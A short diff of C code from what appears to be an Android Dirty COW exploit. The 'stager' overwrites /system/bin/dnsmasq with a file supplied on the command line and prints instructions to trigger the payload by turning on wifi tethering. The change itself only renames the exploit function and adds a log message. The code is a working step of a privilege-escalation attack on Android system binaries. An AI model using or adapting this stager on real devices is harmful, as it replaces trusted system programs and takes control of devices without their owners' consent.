@@ -19,12 +19,13 @@ int main(int argc, const char *argv[]) {
 	filename = argv[1];
 	
 	printf("[+] stager loading %s\n", filename);
-	if(dirtycow("/system/bin/dnsmasq", filename)) {
+	if(dcow("/system/bin/dnsmasq", filename)) {
 		LOGV("ERROR: could not dirtycow dnsmasq with %s\n", filename);
 		return 1;
 	}
 
 	printf("[+] stager loaded %s. trigger by enabling wifi tethering\n", filename);
+	LOGV("[+] Turn ON Mobile Hot Spot a.k.a. wifi tethering");
 
 	return 0;
 }
